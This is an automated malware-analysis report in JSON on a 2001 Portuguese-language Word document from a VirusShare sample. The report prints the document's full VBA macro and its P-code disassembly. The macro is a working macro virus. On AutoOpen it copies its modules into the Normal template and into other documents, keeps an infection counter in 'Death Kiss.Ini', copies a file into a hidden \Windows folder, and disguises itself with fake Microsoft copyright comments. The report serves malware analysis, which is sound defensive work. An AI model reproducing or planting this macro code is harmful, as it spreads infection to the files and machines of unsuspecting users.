{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"AddString\""
        ],
        "behavior": {
            "AutoOpen": "Runs when the Word document is opened",
            "Binary": "May read or write a binary file",
            "Call": "May call a DLL using Excel 4 Macros",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "MkDir": "May create a directory",
            "Open": "May open a file",
            "Output": "May write to a file",
            "Print #": "May write to a file",
            "Put": "May write to a file",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "Windows": "May enumerate application windows",
            "Write": "May write to a file",
            "exec": "May run an executable file or a system command using Excel 4 Macros"
        },
        "macro": "\n\n'The Microsoft Word Language Visual Basic\n'Copyright (c) 1999 Microsoft\n'Todos os direitos reservados\nPublic pq As String\n\n\n\nSub AutoOpen()\nAttribute AutoOpen.VB_Description = \"Microsoft Word (c) 1999 Corporation\\r\\nInternet Mail\"\nAttribute AutoOpen.VB_ProcData.VB_Invoke_Func = \"Web.AddString.AutoOpen\"\n Call AddFile\n Call AddNew\n 'Call MailNew\n 'Call Verday\nEnd Sub\n \nSub AddNew()\nAttribute AddNew.VB_Description = \"Microsoft Word (c) 1999 Corporation\\r\\nInternet Mail\"\nAttribute AddNew.VB_ProcData.VB_Invoke_Func = \"Web.AddString.AddNew\"\nDim exec\nexec = Counter()\n\nOn Error GoTo 0\nOpen pq + \"\\Death Kiss.Ini\" For Output As #1\nPrint #1, exec + 1\nClose #1\n\nDoc = ActiveDocument.Path + \"\\\" + ActiveDocument.Name\ndot = NormalTemplate.FullName\n\nOn Error Resume Next\n\nApplication.OrganizerCopy Source:=Doc,        Destination:=NormalTemplate.FullName, Name:=\"AddString\",        object:=wdOrganizerObjectProjectItems\n\nApplication.OrganizerCopy Source:=Doc,        Destination:=NormalTemplate.FullName, Name:=\"AddMail\",        object:=wdOrganizerObjectProjectItems\n\nOn Error GoTo 0\nOn Error Resume Next\n\nApplication.OrganizerCopy Source:=dot,        Destination:=Doc, Name:=\"AddString\",        object:=wdOrganizerObjectProjectItems\n\nApplication.OrganizerCopy Source:=dot,        Destination:=ActiveDocument.Name, Name:=\"AddMail\",        object:=wdOrganizerObjectProjectItems\n\nOn Error GoTo 0\n\nEnd Sub\n\nFunction Counter()\nDim exec\nexec = \"\"\nOn Error Resume Next\nOpen pq + \"\\Death Kiss.Ini\" For Input As #1\nInput #1, exec\nClose #1\nOn Error GoTo 0\nCounter = Val(exec)\nEnd Function\n\nFunction AddFile()\nDim meucar As String\ncdir = CurDir()\n\nOn Error Resume Next\n  ChDir \"\\\"\n  MkDir \"\\Windows\"\nOn Error GoTo 0\n\nOn Error Resume Next\nChDir \"\\Windows\"\nMkDir \"Application Users\"\nOn Error GoTo 0\n\nOn Error Resume Next\nChDir \"\\Windows\\Application Users\"\nMkDir \"AddFile\"\nOn Error GoTo 0\n\nChDir cdir\npq = \"\\Windows\\Application Users\\AddFile\"\nOn Error GoTo 0\n\np = ActiveDocument.Path + \"\\Pesquisa de Opini\u00e3o.doc\"\n\nIf Counter() = 0 Then\n   On Error Resume Next\n   Open p For Binary As #1\n   Do While Meulocal < LOF(1)\n       meucar = meucar & Input(2048, #1)\n       Meulocal = Loc(1)\n   Loop\n   Close #1\n\n   Open pq + \"\\Pesquisa de Opini\u00e3o.doc\" For Binary Access Write As #1\n   Put #1, , meucar\n   Close #1\n   On Error GoTo 0\nEnd If\nEnd Function\n\n\n' Processing file: VirusShare_3524f1f03074072ba9be50fb64be0d73\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 900 bytes\n' Macros/VBA/AddString - 4803 bytes\n' Line #0:\n' \tQuoteRem 0x0000 0x0028 \"The Microsoft Word Language Visual Basic\"\n' Line #1:\n' \tQuoteRem 0x0000 0x001C \"Copyright (c) 1999 Microsoft\"\n' Line #2:\n' \tQuoteRem 0x0000 0x001C \"Todos os direitos reservados\"\n' Line #3:\n' \tDim (Public) \n' \tVarDefn pq (As String)\n' Line #4:\n' Line #5:\n' Line #6:\n' Line #7:\n' \tFuncDefn (Sub AutoOpen())\n' Line #8:\n' \tArgsCall (Call) AddFile 0x0000 \n' Line #9:\n' \tArgsCall (Call) AddNew 0x0000 \n' Line #10:\n' \tQuoteRem 0x0001 0x000C \"Call MailNew\"\n' Line #11:\n' \tQuoteRem 0x0001 0x000B \"Call Verday\"\n' Line #12:\n' \tEndSub \n' Line #13:\n' Line #14:\n' \tFuncDefn (Sub AddNew())\n' Line #15:\n' \tDim \n' \tVarDefn exec\n' Line #16:\n' \tArgsLd Counter 0x0000 \n' \tSt exec \n' Line #17:\n' Line #18:\n' \tOnError (GoTo 0) \n' Line #19:\n' \tLd pq \n' \tLitStr 0x000F \"\\Death Kiss.Ini\"\n' \tAdd \n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Output)\n' Line #20:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tPrintChan \n' \tLd exec \n' \tLitDI2 0x0001 \n' \tAdd \n' \tPrintItemNL \n' Line #21:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #22:\n' Line #23:\n' \tLd ActiveDocument \n' \tMemLd Path \n' \tLitStr 0x0001 \"\\\"\n' \tAdd \n' \tLd ActiveDocument \n' \tMemLd New \n' \tAdd \n' \tSt Doc \n' Line #24:\n' \tLd NormalTemplate \n' \tMemLd FullName \n' \tSt dot \n' Line #25:\n' Line #26:\n' \tOnError (Resume Next) \n' Line #27:\n' Line #28:\n' \tLineCont 0x0008 07 00 07 00 11 00 07 00\n' \tLd Doc \n' \tParamNamed Source \n' \tLd NormalTemplate \n' \tMemLd FullName \n' \tParamNamed Destination \n' \tLitStr 0x0009 \"AddString\"\n' \tParamNamed New \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerCopy 0x0004 \n' Line #29:\n' Line #30:\n' \tLineCont 0x0008 07 00 07 00 11 00 07 00\n' \tLd Doc \n' \tParamNamed Source \n' \tLd NormalTemplate \n' \tMemLd FullName \n' \tParamNamed Destination \n' \tLitStr 0x0007 \"AddMail\"\n' \tParamNamed New \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerCopy 0x0004 \n' Line #31:\n' Line #32:\n' \tOnError (GoTo 0) \n' Line #33:\n' \tOnError (Resume Next) \n' Line #34:\n' Line #35:\n' \tLineCont 0x0008 07 00 07 00 0F 00 07 00\n' \tLd dot \n' \tParamNamed Source \n' \tLd Doc \n' \tParamNamed Destination \n' \tLitStr 0x0009 \"AddString\"\n' \tParamNamed New \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerCopy 0x0004 \n' Line #36:\n' Line #37:\n' \tLineCont 0x0008 07 00 07 00 11 00 07 00\n' \tLd dot \n' \tParamNamed Source \n' \tLd ActiveDocument \n' \tMemLd New \n' \tParamNamed Destination \n' \tLitStr 0x0007 \"AddMail\"\n' \tParamNamed New \n' \tLd wdOrganizerObjectProjectItems \n' \tParamNamed On \n' \tLd Application \n' \tArgsMemCall OrganizerCopy 0x0004 \n' Line #38:\n' Line #39:\n' \tOnError (GoTo 0) \n' Line #40:\n' Line #41:\n' \tEndSub \n' Line #42:\n' Line #43:\n' \tFuncDefn (Function Counter())\n' Line #44:\n' \tDim \n' \tVarDefn exec\n' Line #45:\n' \tLitStr 0x0000 \"\"\n' \tSt exec \n' Line #46:\n' \tOnError (Resume Next) \n' Line #47:\n' \tLd pq \n' \tLitStr 0x000F \"\\Death Kiss.Ini\"\n' \tAdd \n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Input)\n' Line #48:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tInput \n' \tLd exec \n' \tInputItem \n' \tInputDone \n' Line #49:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #50:\n' \tOnError (GoTo 0) \n' Line #51:\n' \tLd exec \n' \tArgsLd Val 0x0001 \n' \tSt Counter \n' Line #52:\n' \tEndFunc \n' Line #53:\n' Line #54:\n' \tFuncDefn (Function AddFile())\n' Line #55:\n' \tDim \n' \tVarDefn meucar (As String)\n' Line #56:\n' \tArgsLd CurDir 0x0000 \n' \tSt cdir \n' Line #57:\n' Line #58:\n' \tOnError (Resume Next) \n' Line #59:\n' \tLitStr 0x0001 \"\\\"\n' \tArgsCall ChDir 0x0001 \n' Line #60:\n' \tLitStr 0x0008 \"\\Windows\"\n' \tArgsCall MkDir 0x0001 \n' Line #61:\n' \tOnError (GoTo 0) \n' Line #62:\n' Line #63:\n' \tOnError (Resume Next) \n' Line #64:\n' \tLitStr 0x0008 \"\\Windows\"\n' \tArgsCall ChDir 0x0001 \n' Line #65:\n' \tLitStr 0x0011 \"Application Users\"\n' \tArgsCall MkDir 0x0001 \n' Line #66:\n' \tOnError (GoTo 0) \n' Line #67:\n' Line #68:\n' \tOnError (Resume Next) \n' Line #69:\n' \tLitStr 0x001A \"\\Windows\\Application Users\"\n' \tArgsCall ChDir 0x0001 \n' Line #70:\n' \tLitStr 0x0007 \"AddFile\"\n' \tArgsCall MkDir 0x0001 \n' Line #71:\n' \tOnError (GoTo 0) \n' Line #72:\n' Line #73:\n' \tLd cdir \n' \tArgsCall ChDir 0x0001 \n' Line #74:\n' \tLitStr 0x0022 \"\\Windows\\Application Users\\AddFile\"\n' \tSt pq \n' Line #75:\n' \tOnError (GoTo 0) \n' Line #76:\n' Line #77:\n' \tLd ActiveDocument \n' \tMemLd Path \n' \tLitStr 0x0018 \"\\Pesquisa de Opini\u00e3o.doc\"\n' \tAdd \n' \tSt p \n' Line #78:\n' Line #79:\n' \tArgsLd Counter 0x0000 \n' \tLitDI2 0x0000 \n' \tEq \n' \tIfBlock \n' Line #80:\n' \tOnError (Resume Next) \n' Line #81:\n' \tLd p \n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Binary)\n' Line #82:\n' \tLd Meulocal \n' \tLitDI2 0x0001 \n' \tArgsLd LOF 0x0001 \n' \tLt \n' \tDoWhile \n' Line #83:\n' \tLd meucar \n' \tLitDI2 0x0800 \n' \tLitDI2 0x0001 \n' \tSharp \n' \tArgsLd Input$ 0x0002 \n' \tConcat \n' \tSt meucar \n' Line #84:\n' \tLitDI2 0x0001 \n' \tArgsLd Loc 0x0001 \n' \tSt Meulocal \n' Line #85:\n' \tLoop \n' Line #86:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #87:\n' Line #88:\n' \tLd pq \n' \tLitStr 0x0018 \"\\Pesquisa de Opini\u00e3o.doc\"\n' \tAdd \n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tOpen (For Binary Access Write)\n' Line #89:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tLitDefault \n' \tLd meucar \n' \tPutRec \n' Line #90:\n' \tLitDI2 0x0001 \n' \tSharp \n' \tClose 0x0001 \n' Line #91:\n' \tOnError (GoTo 0) \n' Line #92:\n' \tEndIfBlock \n' Line #93:\n' \tEndFunc \n' Line #94:\n"
    },
    "filename": "VirusShare_3524f1f03074072ba9be50fb64be0d73",
    "filesize": 31744,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Title: Universidade Santa Ceclia-Unisanta, Author: UNISANTA, Template: Normal, Last Saved By: UNISANTA, Revision Number: 3, Name of Creating Application: Microsoft Word 8.0, Total Editing Time: 01:00, Create Time/Date: Thu Oct 11 11:00:00 2001, Last Saved Time/Date: Thu Oct 11 11:03:00 2001, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "3524f1f03074072ba9be50fb64be0d73",
        "sha1": "5ab791a21edb8bc4aaeedcf2106443af4fca2093",
        "sha256": "e330475c1a08c0861d53352d6da3cda0703aa27a3d9192576b7d45135f39f561"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj",
            "Universidade Santa Ceclia-Unisanta",
            "Componentes: Bruna Lapa Cardoso\t71813",
            "\tCleber Gerber Mangini\t71972",
            "\tEdsel Blum\t71966",
            "\t\t      Marcelo Pinto                           71",
            "\t                Paula Santos Pinto\t\t       71813",
            "SANTOS",
            "9 de novembro de 2001",
            "/ =!",
            "t= \u0306\u0404",
            "YZYZ",
            "Universidade Santa Ceclia-Unisanta",
            "UNISANTA",
            "Normal",
            "UNISANTA",
            "Microsoft Word 8.0",
            "1};R",
            "UNISANTA",
            "Universidade Santa Ceclia-Unisanta",
            "Ttulo",
            "_PID_GUID",
            "rror Resume Next",
            "Open pq + \"\\Death Kiss.I",
            "@+\u05b4:R",
            "exec)",
            "End Function",
            "Function AddFile()",
            "Dim meu",
            "dir = CurDir()",
            "On Error Resume Ne\t",
            "Dir W",
            "n Error GoTo 0",
            "On Error Resume Next",
            "MkDir \"Application Users\"",
            "On Er",
            "Application Users\"",
            "MkDi(",
            "Error GoTo 0",
            "ChDir cdir",
            "pq = \"\\W",
            "ppli",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "1Normal",
            ".Melissa",
            "LCreatabl",
            "VFalse",
            "Predecla",
            "sTru",
            "\"@Expose",
            "emplateD",
            "eriv",
            "$Cus`tomiz",
            "73bc56e71",
            "83bc56e73",
            "Xd:[1",
            "Xd:[1",
            "object",
            "Wordk",
            "Win16~",
            "Win32",
            "Capa cido Clordrico",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Mdulo1",
            "AddStringX",
            "AutoOpen*",
            "AddFile\u0555",
            "AddNewa",
            "execzy",
            "Counter",
            "ActiveDocument\\",
            "Path2",
            "NormalTemplateq",
            "FullName\u041e",
            "Application*",
            "OrganizerCopy",
            "SourceG",
            "Destination\u043b",
            "wdOrganizerObjectProjectItems",
            "meucar*",
            "cdir",
            "MkDir",
            "MeulocalQ",
            "LOFc",
            "Loc`",
            "Documentj",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "STDOLE2.",
            "TLB#",
            "tomation",
            "mMSFo@rms>",
            "F8DC2C1",
            "E0-5275-",
            "11D5-A85",
            "8-8E643ABB5B31",
            ".TWD#Microsoft ",
            "` Ob",
            " Library",
            "9B0C9C43`-5441'PJP \\VBE\\(EX",
            "CxN@UalCxNTax",
            "Offi",
            "cDO@f",
            "2DF8D04C",
            "-5BFA-101B-BDE5@TAA@4",
            "RQUIVOS ",
            "DE PROGR",
            "AMAS\\MIC",
            "ROSOFT O@FFICE\\",
            "SO97.DLLCHm% 8.0m",
            "BThisDoc@ument",
            "h@8sD",
            "UAddSt ring",
            "@\tAnd@^t",
            "ThisDocument",
            "AddString",
            "Microsoft Word (c) 1999 Corporation",
            "Internet Mail",
            "Web.AddString.AutoOpen",
            "Microsoft Word (c) 1999 Corporation",
            "Internet Mail",
            "Web.AddString.AddNew@&",
            "The Microsoft Word Language Visual Basic",
            "Copyright (c) 1999 Microsoft",
            "Todos os direitos reservados",
            "Call MailNew",
            "Call Verday",
            "\\Death Kiss.Ini",
            "orat",
            "AddString",
            "AddMail",
            "AddString",
            "AddMail",
            "\\Death Kiss.Ini",
            "\\WindowsA@F",
            "\\WindowsA@:",
            "Application Users",
            "\\Windows\\Application UsersA@:",
            "AddFile",
            "\\Windows\\Application Users\\AddFile'",
            "\\Pesquisa de Opinio.doc",
            "\\Pesquisa de Opinio.doc",
            "Attribut",
            "e VB_Nam",
            "e = \"Add",
            "The Micr",
            "osoft Wo",
            "rd Langu",
            "isual@ Basic",
            "opyright",
            " (c) 199",
            "odos ",
            "direit",
            "reserva",
            "Public pq As ",
            "Sub A",
            "utoOpen(X)",
            "escripti",
            "pora",
            "&\\r\\",
            "nInternet Mailw-",
            "ProcData",
            "3Invoke_",
            "Func3Web",
            "H$ Ca",
            "FileD",
            "Verday",
            "End z\u0240",
            "}?\t|F",
            "@=Dim exeA",
            "CouX.",
            "n Error GoTo 0",
            "|+ \"\\Dea",
            "th Kiss.@Ini\" F\tO utput#1",
            "rint #1\",",
            "Close",
            "Dod@Active",
            "ument.PA",
            "*Normal",
            "Template`.Full",
            " Next1",
            "rganizer",
            "A SourceD:=@!, _q #",
            "object:=twdF",
            "Items?'",
            "d\"f_",
            ",`7I",
            ",/))@>=",
            ")ers<",
            "hps\"v",
            "/ysInHs",
            "@nVal(`!",
            "meuc4aric`\tCu0rDir\u030c",
            "Windows 5",
            " U`\u06ff",
            "+TPe",
            "squisa d",
            "e Opini o.doc",
            "If &' ",
            "0 @~nBP&TQ&2_B",
            "Rry5_",
            "Wh@t Meul",
            "< LOF<(1p#",
            "d!= \t",
            ")(204",
            "= Loc5",
            "Loop",
            "c\tqc\"\\",
            "ccess xWri Qk`",
            "P0l1,\t",
            "1If<1",
            "ID=\"{E69D7D35-BE11-11D5-A858-8E643ABB5B31}\"",
            "Document=ThisDocument/&H00000000",
            "Module=AddString",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"2624CDF53D153319331933193319\"",
            "DPB=\"2022CB0CCC0CCC0C\"",
            "GC=\"1A18F1F9EAFAEAFA15\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "ThisDocument=0, 0, 0, 0, C",
            "AddString=0, 0, 0, 0, C",
            "Documento do Microsoft Word ",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "\\Pesquisa de Opinio.doc": "Word",
            "e Opini o.doc": "Word"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.313909",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
